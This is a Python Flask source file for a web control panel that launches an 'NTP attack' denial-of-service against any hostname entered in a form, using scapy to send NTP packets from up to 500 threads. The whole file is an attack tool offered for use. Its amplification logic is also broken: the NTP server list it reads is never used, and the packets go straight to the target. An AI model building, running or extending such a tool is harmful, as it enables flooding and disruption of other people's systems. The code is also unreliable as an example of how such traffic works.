from flask import Flask, request, jsonify, render_template
import random
import socket
import threading
from scapy.all import IP, UDP, Raw, send

app = Flask(__name__)

def read_ntp_servers():
    """Read NTP servers from a file."""
    ntp_servers = []
    try:
        with open('ntp.txt', 'r') as file:
            for line in file:
                parts = line.split()
                if len(parts) >= 1:
                    ntp_servers.append(parts[0])  # Only take the IP address
    except FileNotFoundError:
        print("ntp.txt file not found!")
    return ntp_servers

ntp_servers = read_ntp_servers()

def check_tgt(target):
    """Resolve the target hostname to an IP address."""
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        return None

class NTPAttack:
    def __init__(self, tgt, threads):
        self.tgt = tgt
        self.threads = threads

    def send_ntp_request(self, ntp_server):
        """Send an NTP request to the target."""
        try:
            # Construct the NTP request packet
            packet = IP(dst=self.tgt) / UDP(dport=123) / Raw(load="\x1b" + 47 * "\0")
            send(packet, verbose=False)  # Send the packet without verbose output
            print(f"Sent NTP request to {ntp_server}")
        except Exception as e:
            print(f"Error sending NTP request to {ntp_server}: {e}")

    def start_attack(self):
        """Start the NTP attack using multiple threads."""
        threads = []
        for _ in range(self.threads):
            ntp_server = random.choice(ntp_servers)  # Randomly choose an NTP server
            t = threading.Thread(target=self.send_ntp_request, args=(ntp_server,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def attack():
    target = request.form.get('target', '').strip()  # Get target from form and strip whitespace
    threads = request.form.get('threads', '100')

    if not target:
        return jsonify({"error": "Target is required!"}), 400

    tgt = check_tgt(target)
    if tgt is None:
        return jsonify({"error": f"Can't resolve host: {target}!"}), 400

    try:
        threads = int(threads)
        if threads <= 0 or threads > 500:  # Limit the number of threads to a reasonable range
            return jsonify({"error": "Number of threads must be between 1 and 500!"}), 400
    except ValueError:
        return jsonify({"error": "Invalid number of threads!"}), 400

    attack = NTPAttack(tgt, threads)
    attack.start_attack()

    return jsonify({"message": f"Started attack on {tgt} with {threads} threads."})

if __name__ == '__main__':
    app.run(debug=True)
